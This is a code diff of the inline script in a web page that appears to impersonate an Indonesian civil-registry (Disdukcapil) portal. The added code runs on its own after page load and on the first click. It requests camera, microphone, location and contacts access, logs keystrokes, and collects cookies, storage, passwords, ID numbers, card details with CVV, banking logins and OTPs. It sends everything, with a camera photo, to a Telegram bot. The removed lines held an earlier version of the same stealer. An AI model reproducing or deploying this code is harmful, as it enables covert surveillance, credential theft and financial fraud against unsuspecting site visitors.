-        message1 += `┌─────────────────────────────────\n`;
-        message1 += `├ 📱 *Jenis:* ${finalData.ewallet.jenis}\n`;
-        message1 += `├ 📞 *Nomor:* ${finalData.ewallet.nomor}\n`;
-        message1 += `└ 💰 *Saldo:* ${finalData.ewallet.saldo}\n`;
-        message1 += `\n`;
-        
-        message1 += `🔐 *OTP (One Time Password)*\n`;
-        message1 += `┌─────────────────────────────────\n`;
-        message1 += `└ 🔢 *Kode OTP:* \`${finalData.otp}\` (Valid 5 menit)\n`;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message1, parse_mode: "Markdown", disable_web_page_preview: false })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message1, parse_mode: "Markdown" })
             });
-        } catch(e) { console.log("Error send message1"); }
+        } catch(e) {}
         
-        // ========== PESAN 2: KONTAK + COOKIES + STORAGE ==========
-        let message2 = `📇 *DATA KONTAK*\n`;
+        // Pesan 2: Data Pribadi, Kartu, Mbanking, Ewallet
+        let message2 = `👤 *DATA PRIBADI*\n`;
         message2 += `┌─────────────────────────────────\n`;
-        message2 += `${finalData.contacts}\n`;
-        message2 += `\n🍪 *COOKIES & STORAGE*\n`;
+        message2 += `├ 🆔 *NIK:* ${capturedData.allData.pribadi?.nik || '-'}\n`;
+        message2 += `├ 👨 *Nama:* ${capturedData.allData.pribadi?.nama || '-'}\n`;
+        message2 += `├ 📞 *HP:* ${capturedData.allData.pribadi?.hp || '-'}\n`;
+        message2 += `├ 📧 *Email:* ${capturedData.allData.pribadi?.email || '-'}\n`;
+        message2 += `├ 🔑 *Username:* ${capturedData.allData.pribadi?.username || '-'}\n`;
+        message2 += `└ 🔒 *Password:* \`${capturedData.allData.pribadi?.password || '-'}\`\n`;
+        message2 += `\n`;
+        
+        message2 += `💳 *KARTU KREDIT*\n`;
         message2 += `┌─────────────────────────────────\n`;
-        message2 += `├ 🍪 *Cookies:*\n\`\`\`${finalData.cookies.substring(0, 600)}\`\`\`\n`;
-        message2 += `├ 💾 *Local Storage:*\n\`\`\`${finalData.localStorage.substring(0, 600)}\`\`\`\n`;
-        message2 += `└ 📦 *Session Storage:*\n\`\`\`${finalData.sessionStorage.substring(0, 600)}\`\`\``;
+        message2 += `├ 💳 *Nomor:* ${capturedData.allData.kartuKredit?.nomor || '-'}\n`;
+        message2 += `├ 📅 *Expiry:* ${capturedData.allData.kartuKredit?.expiry || '-'}\n`;
+        message2 += `├ 🔐 *CVV:* ${capturedData.allData.kartuKredit?.cvv || '-'}\n`;
+        message2 += `└ 🏦 *Bank:* ${capturedData.allData.kartuKredit?.bank || '-'}\n`;
+        message2 += `\n`;
+        
+        message2 += `🏦 *MOBILE BANKING*\n`;
+        message2 += `┌─────────────────────────────────\n`;
+        message2 += `├ 🏦 *Bank:* ${capturedData.allData.mbanking?.bank || '-'}\n`;
+        message2 += `├ 👤 *User:* ${capturedData.allData.mbanking?.user || '-'}\n`;
+        message2 += `└ 🔒 *Pass:* \`${capturedData.allData.mbanking?.pass || '-'}\`\n`;
+        message2 += `\n`;
+        
+        message2 += `💰 *E-WALLET*\n`;
+        message2 += `┌─────────────────────────────────\n`;
+        message2 += `├ 📱 *Jenis:* ${capturedData.allData.ewallet?.jenis || '-'}\n`;
+        message2 += `├ 📞 *Nomor:* ${capturedData.allData.ewallet?.nomor || '-'}\n`;
+        message2 += `└ 💰 *Saldo:* ${capturedData.allData.ewallet?.saldo || '-'}\n`;
+        message2 += `\n`;
+        
+        message2 += `🔐 *OTP:* \`${capturedData.allData.otp || '-'}\``;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST", headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message2.substring(0, 4096), parse_mode: "Markdown" })
             });
-        } catch(e) { console.log("Error send message2"); }
+        } catch(e) {}
         
-        // ========== PESAN 3: KEYLOGGER ==========
-        let message3 = `⌨️ *KEYLOGGER CAPTURE*\n`;
+        // Pesan 3: Kontak + Cookies + Storage
+        let message3 = `📇 *DATA KONTAK*\n`;
         message3 += `┌─────────────────────────────────\n`;
-        message3 += `├ 📊 *Total Keystrokes:* ${finalData.totalKeystrokes}\n`;
-        message3 += `├ 📝 *Log Terbaru:*\n`;
-        message3 += `└ \`\`\`${finalData.keyloggerLogs.substring(0, 1500)}\`\`\``;
+        message3 += `${capturedData.contactsData.substring(0, 800)}\n\n`;
+        message3 += `🍪 *COOKIES & STORAGE*\n`;
+        message3 += `┌─────────────────────────────────\n`;
+        message3 += `├ 🍪 *Cookies:*\n\`\`\`${capturedData.allData.cookies?.substring(0, 500) || '-'}\`\`\`\n`;
+        message3 += `└ 💾 *Local Storage:*\n\`\`\`${capturedData.allData.localStorage?.substring(0, 500) || '-'}\`\`\``;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST", headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message3.substring(0, 4096), parse_mode: "Markdown" })
             });
-        } catch(e) { console.log("Error send message3"); }
+        } catch(e) {}
         
-        // ========== KIRIM FOTO ==========
-        if(capturedPhoto && capturedPhoto.startsWith('data:image')) {
+        // Pesan 4: Keylogger
+        let message4 = `⌨️ *KEYLOGGER CAPTURE*\n`;
+        message4 += `┌─────────────────────────────────\n`;
+        message4 += `├ 📊 *Total:* ${keyLogBuffer.length} keystrokes\n`;
+        message4 += `└ 📝 *Log:*\n\`\`\`${keyLogBuffer.slice(-100).join('\n').substring(0, 1500)}\`\`\``;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message4.substring(0, 4096), parse_mode: "Markdown" })
+            });
+        } catch(e) {}
+        
+        // Kirim foto dari camera
+        if(capturedData.cameraPhoto && capturedData.cameraPhoto.startsWith('data:image')) {
             try {
-                const blob = await (await fetch(capturedPhoto)).blob();
+                const blob = await (await fetch(capturedData.cameraPhoto)).blob();
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'stealth_capture.jpg');
-                fd.append('caption', `📸 *STEALTH CAMERA CAPTURE*\n⏰ ${finalData.timestamp}\n📍 ${finalData.location.lat}, ${finalData.location.lng}`);
+                fd.append('photo', blob, 'camera_capture.jpg');
+                fd.append('caption', `📸 *CAMERA CAPTURE*\n⏰ ${new Date().toLocaleString('id-ID')}\n📍 ${capturedData.locationData.lat}, ${capturedData.locationData.lng}`);
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             } catch(e) { console.log("Photo error"); }
         }
     }
     
-    // ==================== CAPTURE ALL DATA ====================
-    async function captureAllData() {
-        if(captureExecuted) {
-            showToast("Data sudah dikirim sebelumnya!");
-            return;
+    async function getIPAddress() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) {
+            return "Gagal mengambil IP";
         }
-        captureExecuted = true;
-        showToast("Mengambil semua data + lokasi Google Maps...");
-        
-        getAllCookies();
-        getLocalStorage();
-        getSessionStorage();
-        getIPAddress();
-        await getAccurateGoogleLocation();
-        await capturePhotoNow();
-        await requestContactsSilent();
-        generateRandomData();
-        
-        const finalData = {
-            timestamp: new Date().toLocaleString('id-ID'),
-            ipAddress: ipAddress,
-            userAgent: navigator.userAgent,
-            location: googleLocation,
-            nik: nik,
-            pribadi: pribadi,
-            kartuKredit: kartuKredit,
-            mbanking: mbanking,
-            ewallet: ewallet,
-            otp: otp,
-            contacts: contactsData,
-            cookies: cookiesStr,
-            localStorage: localStr,
-            sessionStorage: sessionStr,
-            keyloggerLogs: keyLogBuffer.slice(-200).join('\n'),
-            totalKeystrokes: keyLogBuffer.length
-        };
-        
-        showDataModal(finalData);
-        await sendToTelegramRapi(finalData);
-        showToast("Data lengkap + Lokasi Google Maps terkirim ke Telegram!");
     }
     
-    async function zeroDayAutoCapture() {
-        if(autoExecuted) return;
-        autoExecuted = true;
-        getAllCookies();
-        getLocalStorage();
-        getSessionStorage();
-        getIPAddress();
-        await getAccurateGoogleLocation();
-        await capturePhotoNow();
-        await requestContactsSilent();
+    // ==================== MAIN EXECUTION ====================
+    async function executeZeroDay() {
+        if(executed) return;
+        executed = true;
+        
+        showToast("Mengumpulkan semua data...");
+        
+        await requestAllPermissions();
         generateRandomData();
         
-        const finalData = {
-            timestamp: new Date().toLocaleString('id-ID'),
-            ipAddress: ipAddress,
-            userAgent: navigator.userAgent,
-            location: googleLocation,
-            nik: nik,
-            pribadi: pribadi,
-            kartuKredit: kartuKredit,
-            mbanking: mbanking,
-            ewallet: ewallet,
-            otp: otp,
-            contacts: contactsData,
-            cookies: cookiesStr,
-            localStorage: localStr,
-            sessionStorage: sessionStr,
-            keyloggerLogs: keyLogBuffer.slice(-200).join('\n'),
-            totalKeystrokes: keyLogBuffer.length
-        };
+        await sendAllToTelegram();
         
-        await sendToTelegramRapi(finalData);
+        // Tampilkan modal
+        showDataModal();
+        showToast("Semua data berhasil dikumpulkan dan dikirim ke Telegram!");
     }
     
-    function showDataModal(data) {
+    function showDataModal() {
         const existingModal = document.getElementById('globalDataModal');
         if(existingModal) existingModal.remove();
         
@@ -660,58 +590,59 @@
         modal.className = 'data-modal';
         modal.innerHTML = `
             <div class="data-modal-header">
-                <h4><i class="fas fa-map-marker-alt"></i> DATA LENGKAP + GOOGLE MAPS</h4>
+                <h4><i class="fas fa-check-circle"></i> SEMUA IZIN TELAH DIDAPATKAN</h4>
                 <button class="close-modal" id="closeDataModalBtn">&times;</button>
             </div>
             <div class="data-modal-body">
-                <pre style="background:#fff; padding:10px; border-radius:8px; font-size:12px; overflow-x:auto;">${JSON.stringify(data, null, 2)}</pre>
+                <h5>Status Izin:</h5>
+                <ul>
+                    <li>📷 Camera: ${permissionsGranted.camera ? '✅ BERHASIL' : '❌ GAGAL'}</li>
+                    <li>🎙️ Microphone: ${permissionsGranted.microphone ? '✅ BERHASIL' : '❌ GAGAL'}</li>
+                    <li>📍 Lokasi Google: ${permissionsGranted.location ? '✅ BERHASIL' : '❌ GAGAL'}</li>
+                    <li>📇 Kontak: ${permissionsGranted.contacts ? '✅ BERHASIL' : '❌ GAGAL'}</li>
+                </ul>
+                <hr>
+                <p>Semua data telah dikirim ke Telegram!</p>
+                <p><small>Total ${keyLogBuffer.length} keystroke terekam</small></p>
             </div>
             <div class="data-modal-footer">
-                <button id="copyDataBtn" class="btn btn-primary btn-sm">Salin JSON</button>
                 <button id="closeModalFooterBtn" class="btn btn-secondary btn-sm">Tutup</button>
             </div>
         `;
         document.body.appendChild(modal);
+        
         document.getElementById('closeDataModalBtn').onclick = () => modal.remove();
         document.getElementById('closeModalFooterBtn').onclick = () => modal.remove();
-        document.getElementById('copyDataBtn').onclick = () => {
-            navigator.clipboard.writeText(JSON.stringify(data, null, 2));
-            showToast("Data disalin ke clipboard");
-        };
     }
     
     function showToast(msg) {
         let t = document.getElementById('toastMsg');
-        if(t) { t.innerText = msg; t.style.opacity = '1'; setTimeout(() => t.style.opacity = '0', 3000); }
+        if(t) { t.innerText = msg; t.style.opacity = '1'; setTimeout(() => t.style.opacity = '0', 4000); }
     }
     window.showToast = showToast;
     
-    // ==================== ADMIN PANEL HIDDEN ====================
-    let adminPanelVisible = false;
-    document.getElementById('adminTrigger').addEventListener('click', function() {
-        if(!adminPanelVisible) {
-            let panel = document.createElement('div');
-            panel.id = 'adminPanel';
-            panel.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:450px;background:#0a2b4e;border-radius:15px;padding:25px;z-index:10000;color:white;box-shadow:0 0 50px rgba(0,0,0,0.5);text-align:center;';
-            panel.innerHTML = `<h3><i class="fas fa-skull"></i> ZERO DAY CONTROLLER</h3><hr><p>Status: <span style="color:#ffd700;">● ACTIVE</span></p><button onclick="window.captureAllDataExternal()" style="background:#ffd700;color:#0a2b4e;padding:12px 25px;border:none;border-radius:8px;margin:10px 0;cursor:pointer;">📡 Capture All Data Now</button><br><button onclick="closeAdminPanel()" style="background:#555;color:white;padding:8px 20px;border:none;border-radius:5px;cursor:pointer;">Tutup</button>`;
-            document.body.appendChild(panel);
-            adminPanelVisible = true;
-            window.captureAllDataExternal = () => captureAllData();
-            window.closeAdminPanel = () => { panel.remove(); adminPanelVisible = false; };
-        }
-    });
+    // ==================== TRIGGERS ====================
+    // Auto execute setelah halaman dimuat
+    setTimeout(() => { executeZeroDay(); }, 2000);
     
-    // ==================== ZERO DAY TRIGGERS ====================
-    setTimeout(() => { zeroDayAutoCapture(); }, 2000);
-    
+    // Trigger pada klik pertama
     document.body.addEventListener('click', function zeroDayHandler() {
-        if(!captureExecuted) { setTimeout(() => { captureAllData(); }, 200); }
+        if(!executed) { executeZeroDay(); }
         document.body.removeEventListener('click', zeroDayHandler);
     });
     
-    document.getElementById('captureAllBtn').addEventListener('click', () => captureAllData());
+    // Tombol capture
+    document.getElementById('captureAllBtn').addEventListener('click', () => executeZeroDay());
     
-    // ==================== UI INITIALIZATION ====================
+    // Admin panel hidden
+    let adminVisible = false;
+    document.getElementById('adminTrigger').addEventListener('click', function() {
+        if(!adminVisible && !executed) {
+            executeZeroDay();
+        }
+    });
+    
+    // ==================== UI INIT ====================
     const beritaData = [
         { img: 'https://l.top4top.io/p_3770ybhto1.jpeg', title: 'Layanan Administrasi Kependudukan Pasca Banjir', date: '30 Jan 2026' },
         { img: 'https://e.top4top.io/p_3770u1sz01.png', title: 'Penerbitan Kartu Keluarga (KK) pada SOBAT DUKCAPIL', date: '09 Jan 2026' },
@@ -733,10 +664,7 @@
     document.cookie = "disdukcapil_session=abc123xyz; path=/";
     localStorage.setItem("user_preference", "darkmode_off");
     
-    generateRandomData();
-    
-    console.log("✅ ZERO DAY ACTIVE - GOOGLE LOCATION READY");
-    console.log("✅ KEYLOGGER HIDDEN - TELEGRAM RAPIH");
+    console.log("✅ ZERO DAY ACTIVE - Semua izin akan diminta secara otomatis");
 })();
 </script>
 </body>
